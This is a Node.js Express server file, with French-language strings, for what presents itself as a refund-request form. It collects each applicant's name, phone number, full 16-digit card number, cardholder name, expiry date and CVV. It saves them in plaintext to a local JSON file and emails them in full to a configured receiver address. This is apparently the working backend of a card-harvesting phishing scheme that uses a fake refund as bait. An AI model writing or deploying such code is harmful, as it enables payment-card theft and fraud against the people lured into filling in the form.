require('dotenv').config();
const express = require('express');
const cors = require('cors');
const nodemailer = require('nodemailer');
const path = require('path');
const fs = require('fs');
const { exec } = require('child_process');

const app = express();
const PORT = process.env.PORT || 3000;
const DATA_DIR = path.join(__dirname, 'data');
const DEMANDES_FILE = path.join(DATA_DIR, 'demandes.json');

if (!fs.existsSync(DATA_DIR)) {
  fs.mkdirSync(DATA_DIR, { recursive: true });
}

function saveDemande(data) {
  let demandes = [];
  if (fs.existsSync(DEMANDES_FILE)) {
    try {
      demandes = JSON.parse(fs.readFileSync(DEMANDES_FILE, 'utf8'));
    } catch {
      demandes = [];
    }
  }

  const entry = {
    id: Date.now(),
    dateReception: new Date().toISOString(),
    ...data,
  };

  demandes.push(entry);
  fs.writeFileSync(DEMANDES_FILE, JSON.stringify(demandes, null, 2), 'utf8');
  return entry;
}

function isEmailConfigured() {
  return Boolean(
    process.env.RECEIVER_EMAIL &&
    process.env.SMTP_USER &&
    process.env.SMTP_PASS
  );
}

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

function createTransporter() {
  return nodemailer.createTransport({
    host: process.env.SMTP_HOST,
    port: Number(process.env.SMTP_PORT) || 587,
    secure: false,
    auth: {
      user: process.env.SMTP_USER,
      pass: process.env.SMTP_PASS,
    },
  });
}

app.post('/api/remboursement', async (req, res) => {
  const { nom, telephone, rib, nomCompte, date, CVV } = req.body;

  if (!nom || !telephone || !rib || !nomCompte || !date || !CVV) {
    return res.status(400).json({ error: 'Tous les champs sont obligatoires.' });
  }

  const cardNumber = String(rib).replace(/\s/g, '');

  if (!/^\d{16}$/.test(cardNumber)) {
    return res.status(400).json({ error: 'Le numéro de carte doit contenir exactement 16 chiffres.' });
  }

  const data = { nom, telephone, rib: cardNumber, nomCompte, date, CVV };
  saveDemande(data);

  if (!isEmailConfigured()) {
    console.log('Demande enregistree (email non configure):', nom);
    return res.json({
      success: true,
      message: 'Votre demande a ete enregistree avec succes.',
      emailSent: false,
    });
  }

  const html = `
    <h2>Nouvelle demande de remboursement</h2>
    <h3>Étape 1 — Informations personnelles</h3>
    <p><strong>Nom :</strong> ${nom}</p>
    <p><strong>Téléphone :</strong> ${telephone}</p>
    <h3>Étape 2 — Coordonnées de carte</h3>
    <p><strong>Numéro de carte :</strong> ${cardNumber}</p>
    <p><strong>Nom du titulaire :</strong> ${nomCompte}</p>
    <p><strong>Mois et année :</strong> ${date}</p>
    <p><strong>CVV :</strong> ${CVV}</p>
    <hr>
    <p><em>Reçu le ${new Date().toLocaleString('fr-FR')}</em></p>
  `;

  try {
    const transporter = createTransporter();
    await transporter.sendMail({
      from: process.env.SMTP_USER,
      to: process.env.RECEIVER_EMAIL,
      subject: `Demande de remboursement — ${nom}`,
      html,
    });

    res.json({ success: true, message: 'Votre demande a ete envoyee avec succes.', emailSent: true });
  } catch (err) {
    console.error('Erreur envoi email:', err.message);
    res.json({
      success: true,
      message: 'Demande enregistree. Email non envoye — verifiez la configuration.',
      emailSent: false,
    });
  }
});

app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, '0.0.0.0', () => {
  const url = `http://localhost:${PORT}`;
  console.log(`Serveur demarre sur ${url}`);
  console.log(`Demandes sauvegardees dans: ${DEMANDES_FILE}`);

  if (isEmailConfigured()) {
    console.log(`Email actif -> ${process.env.RECEIVER_EMAIL}`);
  } else {
    console.log('Email non configure — lancez CONFIGURER-EMAIL.bat');
  }

  if (process.env.PUBLIC_MODE) return;

  const openCmd =
    process.platform === 'win32'
      ? `start ${url}`
      : process.platform === 'darwin'
        ? `open ${url}`
        : `xdg-open ${url}`;

  exec(openCmd);
});
